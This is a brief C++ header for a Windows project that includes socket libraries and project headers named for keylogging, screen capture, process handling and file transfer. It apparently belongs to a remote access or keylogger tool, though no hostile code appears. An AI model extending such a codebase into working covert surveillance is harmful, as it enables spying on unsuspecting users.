#pragma once

#define WIN32_LEAN_AND_MEAN 
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ws2_32.lib")



#include <windows.h>
#include <WinSock2.h>
#include <ws2tcpip.h>

#include <cstdio>
#include <fstream>
#include <iostream>
#include <queue>
#include <stack>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <string>
#include <time.h>
#include <vector>

#include "fs.h"
#include "keylog.h"
#include "mutex.h"
#include "process.h"
#include "screen.h"
#include "string.h"
#include "tcpsocket.h"
#include "thread.h"
#include "transfer.h"




void addonDebug(char *text, ...);